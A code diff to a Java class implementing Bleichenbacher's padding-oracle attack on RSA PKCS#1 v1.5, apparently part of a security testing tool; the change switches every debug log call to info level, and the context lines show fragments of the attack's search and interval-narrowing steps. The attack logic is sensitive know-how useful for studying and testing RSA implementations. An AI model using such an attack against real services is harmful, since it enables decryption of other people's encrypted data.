@@ -64,8 +64,8 @@ public class BleichenbacherAttack {
         }
         tmp = ((tmp / 8) - 2) * 8;
         bigB = BigInteger.valueOf(2).pow(tmp);
-        logger.debug("B computed: " + bigB);
-        logger.debug("Blocksize: " + blockSize);
+        logger.info("B computed: " + bigB);
+        logger.info("Blocksize: " + blockSize);
         //decryptedMsg = oracle.decrypt(encryptedMsg);
         //System.out.println("our goal: " + new BigInteger(decryptedMsg));
     }
@@ -74,9 +74,9 @@ public class BleichenbacherAttack {
         int i = 0;
         boolean solutionFound = false;
 
-        logger.debug("Step 1: Blinding");
+        logger.info("Step 1: Blinding");
         if (this.msgIsPKCS) {
-            logger.debug("Step skipped --> "
+            logger.info("Step skipped --> "
                     + "Message is considered as PKCS compliant.");
             s0 = BigInteger.ONE;
             c0 = new BigInteger(1, encryptedMsg);
@@ -89,17 +89,17 @@ public class BleichenbacherAttack {
         i++;
 
         while (!solutionFound) {
-            logger.debug("Step 2: Searching for PKCS conforming messages.");
+            logger.info("Step 2: Searching for PKCS conforming messages.");
             stepTwo(i);
 
-            logger.debug("Step 3: Narrowing the set of soultions.");
+            logger.info("Step 3: Narrowing the set of soultions.");
             stepThree(i);
 
-            logger.debug("Step 4: Computing the solution.");
+            logger.info("Step 4: Computing the solution.");
             solutionFound = stepFour(i);
             i++;
 
-            logger.debug("// Total # of queries so far: "
+            logger.info("// Total # of queries so far: "
                     + oracle.getNumberOfQueries());
         }
     }
@@ -127,7 +127,7 @@ public class BleichenbacherAttack {
             new Interval(BigInteger.valueOf(2).multiply(bigB),
             (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE))};
 
-        logger.debug(" Found s0 : " + si);
+        logger.info(" Found s0 : " + si);
     }
 
     protected void stepTwo(final int i) {
@@ -145,7 +145,7 @@ public class BleichenbacherAttack {
             }
         }
 
-        logger.debug(" Found s" + i + ": " + si);
+        logger.info(" Found s" + i + ": " + si);
     }
 
     private void stepTwoA() {
@@ -153,7 +153,7 @@ public class BleichenbacherAttack {
         boolean pkcsConform = false;
         BigInteger n = publicKey.getModulus();
 
-        logger.debug("Step 2a: Starting the search");
+        logger.info("Step 2a: Starting the search");
         // si = ceil(n/(3B))
         BigInteger tmp[] = n.divideAndRemainder(BigInteger.valueOf(3).multiply(bigB));
         if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
@@ -178,7 +178,7 @@ public class BleichenbacherAttack {
         byte[] send;
         boolean pkcsConform = false;
 
-        logger.debug("Step 2b: Searching with more than"
+        logger.info("Step 2b: Searching with more than"
                 + " one interval left");
 
         do {
@@ -195,7 +195,7 @@ public class BleichenbacherAttack {
         boolean pkcsConform = false;
         BigInteger n = publicKey.getModulus();
 
-        logger.debug("Step 2c: Searching with one interval left");
+        logger.info("Step 2c: Searching with one interval left");
 
         // initial ri computation - ri = 2(b*(si-1)-2*B)/n
         BigInteger ri = si.multiply(m[0].upper);
@@ -290,7 +290,7 @@ public class BleichenbacherAttack {
             }
         }
 
-        logger.debug(" # of intervals for M" + i + ": " + ms.size());
+        logger.info(" # of intervals for M" + i + ": " + ms.size());
         m = ms.toArray(new Interval[ms.size()]);
     }
 
@@ -302,7 +302,7 @@ public class BleichenbacherAttack {
             solution = solution.multiply(m[0].upper).mod(publicKey.getModulus());
 
             //if(solution.compareTo(new BigInteger(1, decryptedMsg)) == 0) {
-            logger.debug("====> Solution found!\n" + Utility.bytesToHex(solution.toByteArray()));
+            logger.info("====> Solution found!\n" + Utility.bytesToHex(solution.toByteArray()));
             //    System.out.println("original decrypted message: \n" + Utility.bytesToHex(decryptedMsg));
             //}
 
